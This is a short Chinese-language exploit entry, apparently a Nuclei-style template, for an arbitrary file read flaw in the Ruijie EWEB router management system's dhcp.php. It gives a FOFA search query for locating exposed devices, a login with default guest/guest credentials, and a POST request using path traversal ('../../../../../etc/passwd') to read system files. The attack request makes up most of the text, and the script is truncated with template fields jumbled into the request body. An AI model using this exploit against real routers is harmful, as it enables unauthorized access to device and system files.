# 锐捷EWEB路由器dhcp.php存在文件读取漏洞

- **系统**：锐捷　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`id: ruijie-eweb-dhcp-fileread`　`name: ruijie-eweb-dhcp-fileread`　`author: unknown`　`severity: critical`　`description: ruijie-eweb-dhcp-fileread`　`fofa-query: title="锐捷网络-EWEB网管系统"`　`verified: true`

**请求体 / payload**
```
username=guest&password=guest?
POST /ddi/server/dhcp.php?a=csv HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Cookie: RUIJIEID=eefae4v54ajbanfhvn0aqgaok5; path=/; HttpOnly
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
- raw:
-
Host:
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
username=guest&password=guest?
-
POST /ddi/server/dhcp.php?a=csv HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Cookie: RUIJIEID={{cookie}}; path=/; HttpOnly
Content-Type: application/x-www-form-urlencoded
filePath=../../../../../etc/passwd
extractors:
- type: regex
name: cook…（脚本共 750 字，完整版见原文）
```
- **预期**：200　|　—